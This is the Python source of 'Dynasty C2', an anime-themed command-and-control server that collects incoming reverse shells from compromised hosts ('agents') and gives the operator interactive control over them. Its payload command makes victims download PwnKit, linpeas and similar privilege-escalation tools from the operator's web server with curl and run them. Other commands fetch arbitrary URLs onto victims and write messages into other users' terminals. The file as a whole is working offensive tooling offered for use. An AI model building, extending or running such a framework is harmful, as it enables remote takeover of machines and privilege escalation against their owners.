import socket
import os
import threading
import sys
import select
import uuid 
import random 
import requests
import getpass 
from tabulate import tabulate 


class Nicecolors:
    reset = "\033[0m"
    black = "\033[0;30m"
    red = "\033[0;31m"
    green = "\033[0;32m"
    yellow = "\033[0;33m"
    blue = "\033[0;34m"
    magenta = "\033[0;35m"
    cyan = "\033[0;36m"
    white = "\033[0;37m"

class characters:
    naruto = f"[{Nicecolors.red}Naruto{Nicecolors.reset}]"
    goku = f"[{Nicecolors.yellow}Son Goku{Nicecolors.reset}]"
    sakura = f"[{Nicecolors.green}Sakura{Nicecolors.reset}]"
    monkey = f"[{Nicecolors.blue}Monkey D. Luffy{Nicecolors.reset}]" 
    yagmi = f"[{Nicecolors.cyan}Light Yagmi{Nicecolors.reset}]"

    agent_chars = [naruto, goku, sakura, monkey, yagmi] 

class banners:
    alien = f"""
{Nicecolors.yellow}	
_________________________________________________________                                                  
{Nicecolors.reset}
{Nicecolors.green}
                         ,------------. 
            ///////      |huahahahaha!|   /`., , 
           || -  _|      `------------'  /'/''<
           |/ O  o|              |    _.'   /_'\.
           (-   `\|              |   (_ oOo __) |
            |  `-'|               \    `\:/'    `\ 
       ____/  --- |___             `-   /`       |____ 
      /  `\  .___/ |  \                /'\__(()\_/ _  `\ 
     /    `\      /'   \              |  |  (\\\)__/    | 
    /   /   `\___/'  |  \             |  |   \         / 
{Nicecolors.yellow} 
_________________________________________________________
{Nicecolors.reset}
 
    """ 


    help = f""" 
   {Nicecolors.blue} 
   ------------------------------------------------------------------------------------ 
   {Nicecolors.reset}
                                  
                                  {Nicecolors.yellow}Dynasty - Help Menu{Nicecolors.reset}

   {Nicecolors.yellow}Dynasty - Console{Nicecolors.reset}              

   {Nicecolors.magenta}Command{Nicecolors.reset}                                                                {Nicecolors.magenta}Usage{Nicecolors.reset} 
   -------                                                                ------  

   "help"..................................................{Nicecolors.cyan}Displays this help message{Nicecolors.reset}
   "kill [key]"................................................{Nicecolors.cyan}Kill active characters{Nicecolors.reset}
   "agents"................................................{Nicecolors.cyan}List all characters beaten{Nicecolors.reset}
   "use [agent num].....................................{Nicecolors.cyan}Get a shell to selected agent{Nicecolors.reset}


   {Nicecolors.yellow}Dynasty - In Agent{Nicecolors.reset}

   
   "background".............................................{Nicecolors.cyan}Background selected agent{Nicecolors.reset} 

   "troll".......................................{Nicecolors.cyan}Send commands to tty shells in agent{Nicecolors.reset}
   "show payloads"..................................................{Nicecolors.cyan}View all payloads{Nicecolors.reset}
   "use payload [num]"....................................{Nicecolors.cyan}Activate a payload on agent{Nicecolors.reset} 
   "server status"..........................{Nicecolors.cyan}Check server status and web server status{Nicecolors.reset}
   
   "exit".............................................................{Nicecolors.cyan}Exit the dynasty{Nicecolors.reset} 

   

    The Dynasty! 

   Made with ❤️  by Trevohack 

   """ 
    linux_payloads = [
    [1, "PwnKit"],
    [2, "linuxprivchecker.py"],
    [3, "linpeas.sh"],
    [4, "linux-exploit-suggester.sh"],
    [5, "lse.sh"]
    ]
    payloads_man = tabulate(linux_payloads, headers=["Number", "Payload"], tablefmt="pretty")

conn_list = {}


import platform

def server(HOST, PORT):
    global conn_list

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        client_id = str(uuid.uuid4())
        os_info = platform.platform()
        if "Linux" in os_info:
            os_info = "Linux"
        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info}


def list_agents():
    global conn_list

    data = [] 
    agents = 0
    if conn_list:
        for client_id, client_info in conn_list.items():
            agents += 1
            agent_char = random.choice(characters.agent_chars)
            data.append([agents, client_id, client_info["IP"], agent_char, client_info["OS"]])
        headers = ["Agents", "ID", "IP", "Character", "OS"]
        print(tabulate(data, headers=headers, tablefmt="grid"))

def kill_agent(agent_key):
    global conn_list

    if agent_key in conn_list:
        agent_info = conn_list.pop(agent_key, None)
        if agent_info:
            agent_conn = agent_info.get("Connection")
            if agent_conn:
                agent_conn.close()
                print(f"{Nicecolors.green}[INFO] Agent {agent_key} has been terminated :){Nicecolors.reset}")
            else:
                print(f"{Nicecolors.red}[ERROR] Connection for agent {agent_key} not found :({Nicecolors.reset}")
        else:
            print(f"{Nicecolors.red}[ERROR] Information for agent {agent_key} not found :({Nicecolors.reset}")
    else:
        print(f"{Nicecolors.red}[ERROR] Agent {agent_key} not found :({Nicecolors.reset}")


def start_interaction(agent_num):
    global conn_list
    if conn_list:
        keys = list(conn_list.keys())
        if agent_num <= len(keys):
            cmd_interact(conn_list[keys[agent_num - 1]]["Connection"], keys[agent_num - 1], keys[agent_num - 1])
        else:
            print(f"{Nicecolors.red}[ERROR] Invalid agent number {Nicecolors.reset}")
    else:
        print(f"{Nicecolors.red}[ERROR]No connections{Nicecolors.reset}")


def recv_all(conn, buffer_size=4096): 
    data = b""
    while True:
        chunk = conn.recv(buffer_size)
        if not chunk:
            break
        data += chunk
    return data

def cmd_interact(conn, victim, socket_target):
    print(f"[+] Host: {victim}")
    try:
        while True:
            ready, _, _ = select.select([conn, sys.stdin], [], [], 1)

            if conn in ready:
                data = conn.recv(8912).decode('utf-8')
                if not data:
                    command = input()
                    conn.sendall(command.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output)
                else:
                    print(data, end='')

            if sys.stdin in ready:
                command = input()
                if command.lower() == "quit" or command.lower() == "exit":
                    break
                
                if command.lower() == "show payloads":
                    print(banners.payloads_man)
                
                tmp_var = command.lower().split(' ')
                if "set" in command.lower():
                    if tmp_var[0] == "set":
                        if tmp_var[1] == "payload":
                            selected_payload = int(tmp_var[2])
                            if 0 < selected_payload <= len(banners.linux_payloads):
                                payload = banners.linux_payloads[selected_payload-1][1]
                                if 1 <= int(selected_payload) <= 5:
                                    cmd = f"curl {sys.argv[1]}:{sys.argv[3]}/{payload} -O {payload}"
                                    conn.sendall(cmd.encode('utf-8') + b'\n')
                                    output = conn.recv(8912).decode('utf-8')
                                    print(output)
                                    cmd = f"chmod +x {payload}; ./{payload}"
                                    conn.sendall(cmd.encode('utf-8') + b'\n')
                                    output = conn.recv(8912).decode('utf-8')
                                    print(output) 

                elif tmp_var[0] == "upload": 
                    url = tmp_var[1]
                    try: 
                        r = requests.get(url)
                        file_name = url.split('/')[-1]
                        cmd = f"curl {url} -O {file_name}"
                        conn.sendall(cmd.encode('utf-8') + b'\n')
                        output = conn.recv(8912).decode('utf-8')
                        print(output) 

                    except Exception as e:
                        print(f"Error: {e}")
                        

                if command.lower() == "troll":
                    troll_command = input(f"[TROLL] > ")
                    troll = f"MY=$(tty|cut -d'/' -f4);for L in $(seq 5);do [ $MY == $L] && {{ echo 'Live'; }} || {{ {troll_command} > /dev/pts/$L 2>/dev/null & }};done 2>/dev/null"
                    conn.sendall(troll.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output + "\n")

                else:
                    conn.sendall(command.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output)

    except Exception as e:
        print(f"Error: {e}")
        del conn_list[socket_target]


def server_status(host, web_port):
    print(f"[{Nicecolors.green}INFO{Nicecolors.reset}] Checking Web server status")

    web_app = f"http://{host}:{web_port}"
    response = requests.get(web_app) 

    if response.ok:
        print(f"[{Nicecolors.green}+{Nicecolors.reset}] Web server active. Response code:", response.status_code)
    else:
        print(f"[{Nicecolors.red}+{Nicecolors.reset}] Web server down. Response code:", response.status_code)


def main(host, port):
    hostname = socket.gethostname()
    username = getpass.getuser()
    threading.Thread(target=server, args=(host, port, )).start()

    framework_version = "1.0"
    print(f"""
    {Nicecolors.green}
	  ____                                                       _       _
  /  __    _       _______        ___                       _| |_  _ | |
 |   \ \__| |_    |____   |_ _   /  /                      |_  __|| || |
 |   /  __    \   ___/  _/|_|_| |  |___  __   ___________   / // \| || |
    /  _\/ /\  | |___  _____|   |   _  \|  | |___________| /__  /_| || |
    | |/ _/_/  |   /  /____     |  | |  |  |                / _/ /|_|| |
    \___/  \__/    \_______|   /__/   \___/                /_/  / ___| |  |
                                                            \_/\_\\____|  |
      __                                                             ____/
     /
       Dynasty C2 | Version {framework_version} (beta) | [ {username}:{hostname} ]
                   __/
                         Made by Trevohack

   [ "Dyansty" inspired by ANIME                    ] 
   [  Anime-inspired C2 framework for digital heros ]  

  Listening at {host}:{port} 
  Try help! 

-------------------------------------------------------------------------- 

    {Nicecolors.reset}
    """) 

    while True:
        inp = input(f"[{Nicecolors.yellow}{username}{Nicecolors.reset}@{Nicecolors.cyan}dynasty{Nicecolors.reset}]~# ")
        inp_cmd = inp.split(' ')

        if inp_cmd[0] == "agents":
            starty = threading.Thread(target=list_agents)
            starty.start()
            starty.join()

        elif "exit" in inp:
            print(f"{banners.alien}")
            os._exit(1)

        elif inp == "help" or inp == "h":
            print(f"{banners.help}")

        elif inp_cmd[0] == "kill": 
            if len(inp_cmd) == 2: 
                agent_key = inp_cmd[1] 
                kill_agent(agent_key)
        
        elif inp == "server status":
            server_status(sys.argv[1], sys.argv[3])

        elif inp_cmd[0] == "show" and inp_cmd[1] == "payloads":
            print(f"{banners.payloads_man}")

        elif inp_cmd[0] == "use" and len(inp_cmd) == 2 and inp_cmd[1].isdigit():
            agent_num = int(inp_cmd[1])
            max_agents = list(range(1, 11))
            if agent_num in max_agents:
                starty = threading.Thread(target=start_interaction, args=(agent_num,))
                starty.start()
                starty.join()
            else:
                print(f"{Nicecolors.red}[ERROR] Invalid Agent Number :({Nicecolors.reset}")

if len(sys.argv) != 4:
	print(banners.help)
	sys.exit(1)

else:
    host = sys.argv[1]
    port = sys.argv[2]
    main(host, int(port))
